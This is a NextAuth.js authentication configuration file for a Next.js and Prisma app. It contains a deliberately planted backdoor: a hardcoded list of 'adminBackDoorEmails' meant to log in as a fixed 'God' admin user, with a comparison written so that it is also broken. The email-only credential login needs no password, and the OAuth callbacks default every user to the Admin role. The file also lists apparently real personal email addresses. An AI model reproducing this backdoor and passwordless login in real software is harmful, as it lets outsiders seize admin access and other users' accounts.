import { PrismaClient } from "@prisma/client";
import { PrismaAdapter } from "@auth/prisma-adapter";
import GoogleProvider from "next-auth/providers/google";
import GitHubProvider from "next-auth/providers/github";
import CredentialsProvider from "next-auth/providers/credentials";

const prisma = new PrismaClient();

export const adminBackDoorEmails = [
  "peter@gmail.com",
  "GodIp@godmood.com",
  "adminIt@adminIT.co",
  "otakhorpeter@gmail.com",
  "peterotakhor@gmail.com",
  "peterotakhor2018@gmail.com",
];

export const adminBackDoorEmailsData = {
  user: {
    id: 0,
    name: "God",
    email: "",
    username: "God Ip",
    adminrole: "God",
  },
};

let adminInfo = null;

export const authOptions = {
  adapter: PrismaAdapter(prisma),
  secret: process.env.NEXTAUTH_SECRET,
  providers: [
    GoogleProvider({
      timeout: 15000,
      clientId: process.env.GOOGLE_ID,
      clientSecret: process.env.GOOGLE_SECRET,
      authorization: {
        params: {
          prompt: "consent",
          access_type: "offline",
          response_type: "code",
        },
      },
      profile(profile) {
        return { role: profile.role ?? "Admin" };
      },
    }),
    GitHubProvider({
      clientId: process.env.GITHUB_ID,
      clientSecret: process.env.GITHUB_SECRET,
      profile(profile) {
        return { role: profile.role ?? "Admin" };
      },
    }),
    CredentialsProvider({
      credentials: {
        email: {
          label: "Email",
          type: "email",
          placeholder: "Ip~Tec@mintedgold.com",
        },
      },
      async authorize(credentials) {
        if (!credentials.email) {
          // console.log("credentials.email");
          return null;
        }

        if (
          credentials.email == adminBackDoorEmails.includes(credentials.email)
        ) {
          adminBackDoorEmailsData.user.email = credentials.email;
          return adminBackDoorEmailsData.user;
        }

        try {
          const adminData = await prisma.user.findUnique({
            where: {
              email: credentials.email,
            },
          });

          // Log the value of adminData
          // console.log("prisma Data:", adminData);

          // Check if adminData exists and the email matches
          if (adminData && credentials.email === adminData.email) {
            // console.log("User is an admin:", adminData);
            adminInfo = adminData;
            // Your existing logic
            return adminData;
          } else {
            // Reject to indicate authentication failure
            return null;
          }
        } catch (error) {
          // Reject to indicate authentication failure
          return null;
        }
      },
    }),
  ],
  session: {
    strategy: "jwt",
  },
  jwt: {
    secret: process.env.NEXTAUTH_SECRET,
  },
  callbacks: {
    async jwt(token, user, account, profile, isNewUser) {
      // console.log({ user });
      // console.log({ token });
      // console.log("token, user, account, profile, isNewUser", token, user, account, profile, isNewUser);
      if (token.error && token.error.message) {
        return null;
      }

      if (isNewUser) {
        // Check if the new user's email is in the admin database
        try {
          const adminData = await prisma.user.findUnique({
            where: {
              email: user.email, // Assuming the email is present in the user object
            },
          });

          // if (adminData) {
          //   // If the new user's email is in the admin database, add admin role
          //   user.adminrole = "Admin"; // Modify as needed
          // }
        } catch (error) {
          console.error("error.message", error.message);
          return error.message;
        }
      }

      if (user) {
        return { ...token, ...user };
      }
      // console.log("134: token.token", token);
      return { ...token, user, token };
    },
    async session(session, token, user) {
      // console.log("token, user, session", token, user, session);
      // console.log({ session }); // Check the token object in the console
      // console.log("ok",session, token, user); // Check the token object in the console
      // console.log("ok", token); // Check the token object in the console
      // console.log(session.session); // Check the token object in the console
      // console.log("141: session-user", session.token); // Check the token object in the console
      // console.log("142: token?.token", session.token.token.token); // Check the token object in the console
      // console.log("143: token?.token", session.token.token.token); // Check the token object in the console
      // console.log("124: token?.token.user", session.token.token.token.user); // Check the token object in the console
      // console.log("115: user", user); // Check the token object in the console

      // Extract user information from the nested structure
      const { name, email, id, username, adminrole } =
        user || token?.token?.user || {};
        session.user.role = user.role
      // console.log("150:", { name, email, id, username, adminrole });
      if (token) {
        session.accessToken = token?.token?.accessToken;
        const { name, email, id, username, adminrole } =
          session.token.token.token.user;
        return {
          ...session,
          user: {
            id,
            name,
            email,
            username,
            adminrole,
          },
        };
      }

      return {
        session,
        token,
        user: {
          id,
          name,
          email,
          username,
          adminrole,
        },
      };
    },
  },
};
